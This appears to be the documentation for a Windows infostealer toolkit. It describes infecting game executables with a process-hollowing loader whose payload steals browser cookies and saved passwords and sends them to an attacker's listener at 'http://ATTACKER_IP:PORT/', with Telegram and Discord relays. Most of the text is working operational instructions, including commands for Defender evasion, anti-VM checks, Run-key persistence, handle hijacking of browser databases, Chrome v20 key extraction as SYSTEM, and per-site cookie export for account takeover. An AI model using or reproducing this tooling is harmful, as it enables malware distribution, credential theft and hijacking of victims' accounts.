When `--c2 <url>` is passed, it overrides the auto-detected IP and is used instead
(needed when the victim is on an external network and cannot reach your LAN IP).

When `--no-anti-vm` is passed (or the GUI checkbox is checked), the `CKAV0000`
sentinel is patched to `CKAV0001` in `loader.exe`, disabling VM MAC prefix checks,
`IsDebuggerPresent`, `CheckRemoteDebuggerPresent`, analysis process name checks, and
Sleep timing checks in the payload. Use this when testing on VMware/VirtualBox/QEMU.

### `pick.py` -- manual infector GUI

```bat
python pick.py          :: GUI
python pick.py --cli    :: headless
```

Features: auto IP detection (LAN + public), editable C2 URL field, DETECT LAN IP /
DETECT PUBLIC IP / TEST C2 buttons, anti-VM checkbox, browse for .exe, infect, view
JSON/TXT, open `loot/`/`ifec/`/`drop.json`, rebuild, stop sink. Tag map for target
classification (`bom`, `one-shot`, `risky`, `avoid`, `incompatible`, `out`).

**GUI C2 fields:**
- **C2 URL** (editable): pre-filled with LAN IP + port. Change to public IP for
  external targets.
- **DETECT LAN IP**: fills the C2 URL with `detect_ip()` output (for local testing).
- **DETECT PUBLIC IP**: fetches `https://api.ipify.org` and fills the C2 URL (for
  external targets behind NAT).
- **FIND BEST PORT**: scans ports 9400-9500, picks the first free one, updates the
  port field and C2 URL. Saved to `config.json` on close.
- **TEST C2**: TCP-connects to the C2 host:port to verify the listener is reachable.
- **NAT warning**: shown when a private IP (RFC 1918) is detected, with port-forward
  instructions.
- **Disable anti-VM** checkbox: patches `CKAV0000` -> `CKAV0001`.

### `listen.py` -- HTTP listener

```bat
python listen.py [port]    :: default port 8080
```

- Forces IPv4 (`HTTPServerV4` with `address_family = socket.AF_INET`)
- Overrides `server_bind()` to skip `getfqdn()` (4s DNS delay fix)
- Outputs: `loot/all_cookies.json` (Cookie-Editor, no passwords) + `loot/all_cookies.txt` (Netscape)
- Passwords: `loot/passwords.json` + `loot/passwords.txt` (saved passwords with usernames)
- Session filter: `loot/session_cookies.json` + `loot/session_cookies.txt` (session-only, no passwords)
- Web UI: `GET /` (summary), `GET /all` (JSON), `GET /passwords` (JSON), `GET /session` (session JSON)
- Dedup by `(domain, name, path)`
- Relay: `--telegram <bot_token:chat_id>` and `--discord <webhook_url>` forward summaries via HTTPS

### `cookielog.py` -- legacy extractor

Direct Python extraction with no injection. Reads browser SQLite databases directly and
decrypts with DPAPI + AES-GCM. Works on Chrome <127, Edge, Brave, Vivaldi, Opera, and Firefox.

```bat
python cookielog.py                    :: one-shot -> cookies_all.json + cookies_all.txt
python cookielog.py --live             :: continuous, logs changes to cookie_log.jsonl
python cookielog.py --firefox          :: filter to one browser
python cookielog.py --chrome --edge --brave
```

Outputs go to the repo root: `cookies_all.json` + `cookies_all.txt`.

**Chrome >=127 app-bound (v20) key.** Chrome 127+ uses an encryption key bound to
`elevation_service.exe` via machine DPAPI. Extraction requires three stages:

```bat
:: stage 1: MACHINE DPAPI (must run as SYSTEM via PsExec)
tools\PsExec64.exe -s -i -accepteula python cookielog.py --v20-sys

:: stage 2: USER DPAPI (back to your own user)
python cookielog.py --v20-usr

:: stage 3: extract
python cookielog.py
```

Stage 2 writes the decrypted key to `C:\ProgramData\cookielog\v20.key`, which stage 3 reads.

### `session_break.py` -- session cookie extractor + cryptanalysis

Standalone Python tool that extracts session cookies from a running browser via handle
hijacking (same technique as the C++ payload), decrypts them with DPAPI + AES-256-GCM,
and performs full cryptanalysis on the decrypted values. No injection required -- runs
directly on the attacker's machine.

```bat
python session_break.py                           :: extract from all Chromium browsers
python session_break.py --browser vivaldi          :: target one browser
python session_break.py --browser vivaldi --report :: extract + cryptanalysis report
```

What it does:

1. **Handle hijack** -- enumerates all system handles via `NtQuerySystemInformation(0x40)`
   with a growing buffer (4MB -> 12MB+), finds the browser's SQLite DB handle, duplicates
   it with `DUPLICATE_SAME_ACCESS`, and reads the file via `ReadFile`. No need to close the
   browser.
2. **Key extraction** -- reads `Local State`, base64-decodes the `encrypted_key`, and
   calls `CryptUnprotectData` (DPAPI) to recover the 32-byte AES key.
3. **Decryption** -- decrypts each cookie value with `BCryptDecrypt` (AES-256-GCM).
   Detects and strips the 32-byte `SHA256(host_key)` domain hash prefix (Chrome >= 118).
4. **Classification** -- classifies each session cookie value: JWT, hex, base64, numeric,
   URL-encoded JSON, opaque token, Express signed, two-part token.
5. **JWT analysis** -- decodes JWT header + payload, assesses `alg` for forgery
   vulnerabilities (`none`, `HS256` with weak key, `RS256` key confusion).
6. **Forgery assessment** -- evaluates whether each session can be forged without the
   server secret (entropy analysis, known-key check, algorithm confusion).
7. **Correlation** -- finds shared prefixes, substrings, and duplicate values across
   cookies from different domains.

Outputs:
- `loot/session_decrypted.json` -- decrypted session cookies with analysis metadata
- `loot/cryptanalysis_report.json` -- classification summary, forgery assessment, correlations

### `swap.py` -- post-processing

Splits the captured cookies into per-site Netscape files for selective import:

```bat
python swap.py                         :: list sites on hand
python swap.py netflix                 :: swap\netflix.com.txt (non-expired)
python swap.py netflix --session       :: live session only
python swap.py netflix --session --keep :: session with artificial expiry
python swap.py google --auth           :: auth cookies only
```

Generates `swap\<site>.txt` in Netscape format, importable via Cookie-Editor -> Import.
`--keep` gives session cookies an artificial expiry so the browser doesn't discard them on
tab close; `--auth` keeps only cookies whose names match login/token patterns.

### `build.bat` -- compile

Compiles the payload DLL and the loader. Requires MSVC (`cl.exe`).

```bat
build.bat
```

Produces:

- `bin\ckdll.dll` -- payload (~49 KB, CRT-less, `/NODEFAULTLIB /ENTRY:payload_entry`)
- `bin\loader.exe` -- loader (~156 KB, `/MT` static CRT, GUI subsystem)
- `src\payload.h` -- the DLL as a byte array, embedded into the loader

### Testing the listener

```bat
:: terminal 1
python listen.py 9090

:: terminal 2
test_curl.bat 9090
```

`test_curl.bat` POSTs a single fake cookie via `curl`. If the listener prints
`[+] 1 cookies received` and replies `ok`, the HTTP path works.

---

## Output files

| File | What it is | Produced by |
|---|---|---|
| `ifec/folds/<name>/<name>.exe` | Infected exe (folder mode, with dependencies) | `auto.py` |
| `ifec/apps/<name>.exe` | Infected exe (standalone mode) | `auto.py` |
| `ifec/<name>.exe` | Infected exe (legacy, from `pick.py`) | `pick.py` |
| `loot/all_cookies.json` | All cookies, Cookie-Editor JSON (browser-importable, no passwords) | `listen.py` |
| `loot/all_cookies.txt` | All cookies, Netscape format (curl/wget) | `listen.py` |
| `loot/passwords.json` | Saved passwords with usernames (JSON) | `listen.py` |
| `loot/passwords.txt` | Saved passwords (tab-separated: domain, username, password) | `listen.py` |
| `loot/session_cookies.json` | Session-only cookies, Cookie-Editor JSON | `listen.py` |
| `loot/session_cookies.txt` | Session-only cookies, Netscape format | `listen.py` |
| `loot/session_decrypted.json` | Decrypted session cookies + analysis metadata | `session_break.py` |
| `loot/cryptanalysis_report.json` | Cryptanalysis summary (classification, forgery, correlations) | `session_break.py` |
| `loot/cookies_all.json` | All cookies JSON (pipe mode) | `sink.py` |
| `loot/cookies_all.txt` | Netscape format (pipe mode) | `sink.py` |
| `cookies_all.json` | All cookies JSON (repo root) | `cookielog.py` |
| `cookies_all.txt` | Netscape format (repo root) | `cookielog.py` |
| `cookie_log.jsonl` | Continuous change log (one line per change) | `cookielog.py --live` |
| `swap/<site>.txt` | Per-site Netscape cookies | `swap.py` |
| `C:\ProgramData\cookielog\v20.key` | Decrypted Chrome v20 app-bound key | `cookielog.py --v20-usr` |
| `C:\ProgramData\cookielog\drop.json` | Local fallback dump (no C2, no pipe) | `ckdll.dll` payload |
| `C:\ProgramData\cookielog\debug.log` | Payload debug trace (built with `/DDEBUG`) | `ckdll.dll` payload |
| `~ck_bak.bin` | Hidden backup of infected exe (created on victim, auto-deleted) | `loader.exe` |

---

## Technical details

### Process hollowing

The loader injects the payload by hollowing a fresh `notepad.exe` (v5; previously
`cmd.exe`, which is a known Defender signature). If `notepad.exe` is not found at
`C:\Windows\System32\notepad.exe`, it falls back to `cmd.exe`.

1. `CreateProcessW(notepad.exe, CREATE_SUSPENDED | CREATE_BREAKAWAY_FROM_JOB)` -- suspended,
   no console window.
2. `NtUnmapViewOfSection` -- unmaps the original `notepad.exe` image at its base address.
3. `VirtualAllocEx` at the payload's preferred `ImageBase`.
4. `WriteProcessMemory` -- writes the PE headers and each section from the decrypted
   `g_payload` buffer (XOR-decrypted at runtime by `DecryptPayload()`).

   **Dynamic API resolution (v5):** `WriteProcessMemory`, `VirtualAllocEx`,
   `VirtualProtectEx`, and `CreateRemoteThread` are resolved at runtime via
   `GetProcAddress(kernel32, ...)` instead of appearing in the loader's IAT. This
   removes the classic process-injection import table signature.
5. IAT fixup -- resolves imports from system DLLs (same base in all processes of the session).
6. `NtCreateThreadEx` with the `HIDE_FROM_DEBUGGER` (`0x1`) flag on the payload entry point.
7. The main thread is **never resumed** -- the original entry point was unmapped; resuming it
   would cause an access violation. The payload runs entirely on the remote thread.

### Infected .exe format

A standalone infected binary is the loader with the original host appended:

```
[loader.exe bytes][host.exe bytes][host_len:uint32 LE][magic "CKLG":4]
```

On launch, the loader detects the trailing `CKLG` magic, reads `host_len`, extracts the
original host bytes, and runs them. The original host file on disk is never modified -- the
infected copy lives in `ifec/`.

### Rename-restore

When the victim double-clicks the infected `.exe`, the loader must execute the host under
its **original filename**. It:

1. Renames the infected exe to a hidden `~ck_bak.bin` in the same directory.
2. Writes the extracted original host bytes back to the original filename.
3. Executes the restored file.

This is required for **Unity games**, which derive their data path from the exe name (they
look for `<exename>_Data/`). If the host were extracted as `~ck_tmp.exe`, Unity would look
for `~ck_tmp_Data/` and fail with an error window. Rename-restore preserves the name so
Unity finds `_Data/`, `UnityPlayer.dll`, etc.

If AV blocks the rename, the loader falls back to extracting as `~ck_tmp.exe` (works for
apps that don't depend on their own filename). The `~ck_bak.bin` backup is either deleted
immediately or scheduled for deletion on next reboot (`MOVEFILE_DELAY_UNTIL_REBOOT`).

### C2 sentinel patching

In `ckdll.cpp`, three sentinel-marked buffers are declared with recognizable patterns:

```c
static char g_c2_url[256]  = "CKC2_DEADBEEF_";   // 14-byte sentinel (C2 URL)
static char g_persist[8]   = {'C','K','P','R','_','_','_','_'};  // persistence on/off
static char g_skip_av[8]   = {'C','K','A','V','0','0','0','0'}; // anti-VM on/off
```

The loader (`loader.cpp`) has its own plaintext copies of these three sentinels in its
`.data` section. `auto.py` / `pick.py` patch the **loader's** sentinels (which are
plaintext and findable in the compiled `loader.exe`):

| Sentinel | Patched value | Effect |
|---|---|---|
| `CKC2_DEADBEEF_` | `http://ATTACKER_IP:PORT/` | C2 URL for HTTP exfiltration |
| `CKPR____` | `CKPR0001` | Enable registry Run-key persistence |
| `CKAV0000` | `CKAV0001` | Disable anti-VM checks (VM targets) |

At runtime, `DecryptPayload()` in the loader:
1. XOR-decrypts `g_payload_enc[]` with `g_xor_key[16]` to recover the raw DLL bytes.
2. Searches the decrypted buffer for the three sentinel patterns.
3. Overwrites them with the loader's own (already-patched) values.
4. The patched buffer is then injected into the hollowed process.

This keeps the payload encrypted in the loader binary (Defender can't signature-match
the DLL strings) while still allowing `auto.py` to configure C2/persist/anti-VM via
the loader's plaintext sentinels.

If `g_c2_url` still starts with `CKC2` after patching (no C2 configured), the payload
falls back to the local pipe / file path.

### Winsock2 exfiltration

The payload uses raw **Winsock2** (`WSAStartup` -> `socket` -> `inet_addr` -> `connect` ->
`send`) for the HTTP POST, not WinHTTP/WinINet. WinHTTP/WinINet fail inside a hollowed process
with error `12029` ("proxy configuration unavailable") because the hollowed process never
initialized the WinHTTP proxy subsystem. Raw Winsock2 has no such dependency.

The HTTP request is built manually (`POST / HTTP/1.1\r\nHost: ...\r\nContent-Length: ...\r\n
Connection: close\r\n\r\n`) and the body is sent in 32 KB chunks.

Exfiltration priority in the payload:

1. **HTTP POST to C2** -- if the sentinel was patched with a URL.
2. **Named pipe** `\\.\pipe\ck_pipe` -- if `sink.py` is running locally (20 retries, 250ms each).
3. **Local file** `C:\ProgramData\cookielog\drop.json` -- final fallback.

### CRT-less payload DLL

`ckdll.dll` is built without the C runtime to stay small and injectable:

- `/NODEFAULTLIB /ENTRY:payload_entry /DYNAMICBASE:NO /BASE:0x5F000000`
- `/GUARD:NO /MACHINE:X64`, linked against `kernel32.lib crypt32.lib bcrypt.lib` only.
- Custom `memcpy` / `memset` / `memmove` / `memcmp` implementations (no CRT).
- Manual FIPS 180-4 SHA-256 implementation for domain hash verification (no CRT hash).
- `/Od /Oi-` -- **optimization disabled**. The compiler's SSE-vectorized `memcpy` crashes
  inside the hollowed process; disabling intrinsics prevents that.

`gen.ps1` converts the compiled `ckdll.dll` into `src/payload.h` (a `g_payload[]` byte array),
which `loader.cpp` embeds.

### Cookie-Editor JSON format

All extractors emit cookies in Cookie-Editor JSON, directly importable via the browser
extension:

```json
{
  "domain": ".example.com",
  "name": "sessionid",
  "value": "abc123",
  "path": "/",
  "expirationDate": 1735689600,
  "secure": true,
  "httpOnly": true,
  "sameSite": "Lax",
  "hostOnly": false,
  "session": false
}
```

`hostOnly` is `true` when the domain does not start with `.`. `session` is `true` when
`expirationDate` is `0`. `sameSite` is normalized across browsers (Chromium encodes
2=None/1=Strict/0=Lax; Firefox encodes 0=None/1=Lax/2=Strict -- the payload translates both).

For step-by-step instructions on importing these files into the Cookie-Editor browser
extension, see **[COOKIE_EDITOR_GUIDE.md](COOKIE_EDITOR_GUIDE.md)**.

### Chromium cookie decryption

Chromium stores cookie values encrypted with AES-256-GCM:

1. **v10/v11 key** -- the `encrypted_key` in `Local State` is base64 + DPAPI-wrapped. The
   payload calls `CryptUnprotectData` (user DPAPI) to recover the 32-byte key.
2. **Cookie value** -- `v10`/`v11`-prefixed blobs are decrypted with AES-256-GCM via CNG
   (`BCryptOpenAlgorithmProvider` / `BCryptGenerateSymmetricKey` / `BCryptDecrypt`): 3-byte
   prefix, 12-byte IV/nonce, ciphertext, 16-byte GCM tag.

**Chrome >=118 domain hash prefix.** Both v10 and v20 cookies have a 32-byte
`SHA256(host_key)` hash prepended to the decrypted plaintext. The payload verifies this by
computing `SHA256(host_key)` (using the manual FIPS 180-4 implementation) and comparing it
to the first 32 bytes of the decrypted output. If they match, the 32 bytes are stripped
before output. If they don't match (passwords, or cookies from Chrome <118), 0 bytes are
stripped. This is critical because passwords are also v10-encrypted but do not have the
domain hash prefix -- unconditionally stripping 32 bytes would corrupt password values.

The `DecCookie` function signature:

```c
static bool DecCookie(const unsigned char* enc, int n,
                      unsigned char* out, int* on,
                      const char* host_key);  // cookie domain for SHA256 verification
```

For cookies, `host_key` is the cookie's domain (e.g. `.youtube.com`). For passwords,
`host_key` is the origin URL -- the SHA256 won't match, so no bytes are stripped.

### Manual SHA-256 (FIPS 180-4)

The CRT-less payload cannot use standard library hash functions. A from-scratch SHA-256
implementation is included in `ckdll.cpp` (~60 lines):

```c
static void Sha256Hash(const unsigned char* data, unsigned int len,
                       unsigned char* out32);
```

Uses only custom `memset`/`memcpy` (no CRT). The implementation follows FIPS 180-4:
64-round compression, 8-word state, 64-entry constant table, message padding with
1-bit + length encoding. The 32-byte digest is used exclusively for domain hash
verification in `DecCookie`.

### Firefox cookies

Firefox stores cookies as **plaintext** in `cookies.sqlite` (`moz_cookies.value`). No
decryption is needed; the payload reads `name`, `value`, `host`, `path`, `expiry`,
`isSecure`, `isHttpOnly`, `sameSite` directly.

### CopyFileShared (bypassing browser file locks)

Browsers hold a lock on their live `Cookies` SQLite database. The payload uses `CopyFileShared()`
which calls `CreateFileW(FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE)` + manual `ReadFile`
instead of `CopyFileW`. This bypasses most browser locks -- Firefox and Chrome work even while
the browser is running.

**Handle hijacking (0-sharing locks).** Vivaldi holds a 0-sharing lock (no share flags at all)
on its cookie DB, so even `CopyFileShared` fails with error 32. When this happens, the payload
falls back to `HijackCookieDB()`:

1. `NtQuerySystemInformation(0x40)` enumerates all system handles (~306k handles, 12MB buffer).
2. Filters handles belonging to the browser process (`vivaldi.exe`, `chrome.exe`, etc.).
3. Duplicates each file handle with `DUPLICATE_SAME_ACCESS` -- not `GENERIC_READ`, because
   Vivaldi's handle has `FILE_READ_DATA` but not `READ_CONTROL`, so `GENERIC_READ` fails.
4. Reads the first 16 bytes and checks for the `SQLite format 3\x00` magic.
5. Reads the full file via `ReadFile` in 64KB chunks to a temp path.
6. Opens with sqlite3 and verifies the expected table (`cookies` or `logins`) exists.

This works on Vivaldi, Chrome, Edge, and Brave while the browser is running -- no need to close it.

The copied database (and its `-wal`/`-shm` companions) go to `%TEMP%\ck_db.tmp` before being
opened read-only with SQLite.

### `auto.py --run` local test flow

1. Backup original .exe to `.orig` (standalone mode only; folder mode skips this -- the
   loader's rename-restore handles it).
2. Copy infected exe over original (standalone) or run directly from `ifec/folds/` (folder).
3. Execute -- the loader opens the game, does process hollowing, runs the payload.
4. Wait 10s (game opens + payload starts).
5. Kill the loader process.
6. Wait 25s (payload extraction + HTTP exfiltration).
7. Kill the game by exe name (`taskkill /F /IM`).
8. Kill orphaned hollowed `notepad.exe` by `ParentProcessId` (PowerShell, targeted).
9. Restore original .exe (standalone mode only, 5 retries with 3s intervals).
10. Wait for cookies in `loot/all_cookies.json` (5 min timeout).

---

## Build requirements

- **Windows 10/11 x64**
- **Python 3.8+** (tested with 3.14)
- **MSVC (`cl.exe`)** -- Visual Studio 2022 Build Tools, C++ workload -- only needed to compile
  the payload (`build.bat`). The legacy Python extractors and listener need no compiler.
- **Python deps:**

  ```bat
  pip install -r requirements.txt
  ```

  Installs `cryptography` (DPAPI / AES-GCM for `cookielog.py`) and `websocket-client` (CDP,
  used by the legacy live mode).
- **PsExec64.exe** -- included under `tools/`. Only needed for the Chrome >=127 v20 app-bound
  key extraction (`cookielog.py --v20-sys`).

---

## Troubleshooting

| Symptom | Cause | Fix |
|---|---|---|
| `connect failed: 10061` in debug.log | Listener not up or wrong port -- `listen.py` was slow to start (getfqdn DNS delay) | Fixed in current `listen.py` (server_bind override). Ensure `listen.py` is running before the victim executes |
| `WinError 32` restoring original .exe after `--run` | Game process holds the file lock | Fixed in current `auto.py` (kills game by name + targeted notepad.exe by PID). Close the game manually if retries fail |
| Unity "Error" window on the host | Host was extracted as `~ck_tmp.exe`, so Unity looked for `~ck_tmp_Data/` | Rename-restore (default) preserves the original exe name; ensure the rename to `~ck_bak.bin` isn't blocked by AV |
| WinHTTP error `12029` | WinHTTP/WinINet fail inside a hollowed process (proxy config unavailable) | The payload uses Winsock2, not WinHTTP -- rebuild `ckdll.dll` if you hit this (current code already uses Winsock2) |
| `loader: base 0x5F000000 occupied` | Another process already mapped the payload's fixed base address | Use a different host `.exe`, or reboot / close the conflicting process |
| Cookies not received by listener | `listen.py` not running, wrong C2 URL, or firewall blocking the port | Confirm `listen.py` is up, the C2 URL matches `http://<attacker-ip>:<port>/`, and the port is open in the firewall |
| No Chromium cookies decrypted | Chrome >=127 uses the app-bound v20 key, which isn't present | Run `cookielog.py --v20-sys` (as SYSTEM via PsExec) then `--v20-usr` to generate `v20.key`, then re-extract |
| `DumpChromium: copy failed (browser running?)` | Browser holds a 0-sharing lock on the cookie DB (`CopyFileShared` failed, error 32) | The payload falls back to handle hijacking automatically. If hijack also fails, the browser may not have the DB open -- close and reopen it, or check `debug.log` for `HijackCookieDB` messages |
| Invalid JSON at listener (`Invalid control character at: line 1 column 73`) | Old payload used raw `Put()` (no escaping) for password values -- binary chars in decrypted passwords break JSON | Fixed in current build (`Put()` replaced with `PutJ()`). Rebuild with `build.bat` |
| DPAPI failed (`CryptUnprotectData` returns false) | Running as a different user than the profile owner | Run the extraction in the target user's context (DPAPI keys are per-user) |
| `[-] no MSVC` during build | Visual Studio C++ Build Tools not installed | Install VS 2022 Build Tools with the C++ workload and run from a Developer Command Prompt |
| No cookies in `loot/` after local test | Payload fell back to `drop.json` because no C2 and `sink.py` wasn't running | Either set a C2 URL + run `listen.py`, or run `sink.py` for pipe mode; check `C:\ProgramData\cookielog\drop.json` |
| Cookie/password values contain `Ã§` or `Ã£` instead of `ç` or `ã` | Old payload escaped bytes >= 0x80 as `\u00XX`, corrupting UTF-8 multi-byte sequences | Fixed in v4 (PutJ passes bytes >= 0x80 as raw UTF-8). Rebuild with `build.bat` |
| Cookie values have 32 bytes of binary garbage at the start | Chrome >=118 prepends SHA256(host_key) to decrypted plaintext; old payload didn't strip it | Fixed in v4 (DecCookie verifies and strips 32-byte domain hash). Rebuild with `build.bat` |
| Password values have 32 bytes of binary garbage at the start | Old v3 fix unconditionally stripped 32 bytes from all v10 values, including passwords | Fixed in v4 (DecCookie only strips when SHA256(host_key) matches). Rebuild with `build.bat` |
| **Windows Defender detects the infected exe as a virus** (v5) | Payload DLL was plaintext in `loader.exe`; injection imports (`WriteProcessMemory`, `VirtualAllocEx`, `CreateRemoteThread`) were in the IAT; `cmd.exe` hollowing is a known signature | Fixed in v5: payload is XOR-encrypted in `payload.h` (decrypted at runtime); injection APIs resolved dynamically via `GetProcAddress`; hollowing uses `notepad.exe` instead of `cmd.exe`. Rebuild with `build.bat` |
| **Victim on external network returns no data** (v5) | `detect_ip()` returns a LAN address (192.168.x.x); the victim cannot reach it | Use `--c2 http://YOUR_PUBLIC_IP:PORT/` or the GUI "DETECT PUBLIC IP" button. Port-forward the listener port on your router. A NAT warning is printed when a private IP is detected |
| Payload doesn't run in VMware / VirtualBox | Anti-VM checks (MAC prefix, `IsDebuggerPresent`, analysis process names) detect the VM and exit | Use `--no-anti-vm` (CLI) or check "Disable anti-VM" (GUI) to patch `CKAV0000` -> `CKAV0001` |
| `inet_addr` / `connect` fails in debug.log | C2 URL was not patched (sentinel still `CKC2_DEADBEEF_`) or wrong IP/port | Verify `auto.py` patched the loader sentinel; check the C2 URL with the GUI "TEST C2" button |
| `OSError: [WinError 10048]` starting listener | Port is already in use by another process | Use `--find-port` (CLI) or the GUI "FIND BEST PORT" button to auto-scan for a free port |

---

## `.bat` / shortcut scripts

| Script | What it does |
|---|---|
| `install.bat` | One-click dependency installer (Python, MSVC, CLI tools, build, cmd_init) |
| `auto.bat` | Shortcut: `python auto.py %*` |
| `tg_chatid.py` | Finds Telegram chat ID from bot token, saves to `config.json` |
| `session_break.py` | Python session cookie extractor + cryptanalysis (handle hijack + DPAPI + AES-GCM + JWT analysis) |
| `start_attack.bat` | Launches `listen.py` (port 9090) + `pick.py` GUI together |
| `test_curl.bat` | POSTs a fake cookie to the listener via `curl` to verify it works |
| `build.bat` | Compiles `ckdll.dll` + `loader.exe` (runs `gen.ps1` to XOR-encrypt the DLL into `payload.h`, then compiles the loader with the encrypted payload) |
| `cmd_init.cmd` | Linux-style aliases for cmd.exe (`ls`, `cat`, `grep`, `..`) + cookielog + Python shortcuts |
| `COOKIE_EDITOR_GUIDE.md` | Step-by-step guide for importing session cookies into Cookie-Editor |
